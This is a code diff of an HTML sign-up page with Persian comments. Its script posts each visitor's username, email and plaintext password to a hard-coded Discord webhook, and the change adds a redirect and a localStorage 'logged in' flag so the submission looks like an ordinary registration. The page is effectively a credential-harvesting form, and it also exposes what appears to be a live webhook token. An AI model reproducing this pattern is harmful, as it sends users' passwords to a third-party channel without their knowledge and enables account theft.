@@ -90,7 +90,7 @@
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1412388207143686214/nL7ZUkfYZ6YrDnjv42cvoTVpG1qddSAwsDQZBZcWPIzYqbkwialBozd5M1ZAmPmVrdA6"; // وبهوک دیسکوردت
+    const webhookURL = "https://discord.com/api/webhooks/1412388207143686214/nL7ZUkfYZ6YrDnjv42cvoTVpG1qddSAwsDQZBZcWPIzYqbkwialBozd5M1ZAmPmVrdA6";
 
     document.getElementById("registerForm").addEventListener("submit", async (e) => {
       e.preventDefault();
@@ -103,13 +103,21 @@
         content: `📥 **ثبت‌نام جدید**\n👤 یوزرنیم: ${username}\n📧 ایمیل: ${email}\n🔑 پسورد: ${password}`
       };
 
-      await fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
 
-      alert("ثبت نام انجام شد ✅");
+        // ذخیره وضعیت لاگین
+        localStorage.setItem("isLoggedIn", "true");
+
+        // ریدایرکت به صفحه اصلی
+        window.location.href = "index.html";
+      } catch (err) {
+        alert("❌ خطا در ثبت‌نام، دوباره تلاش کنید.");
+      }
     });
   </script>
 </body>
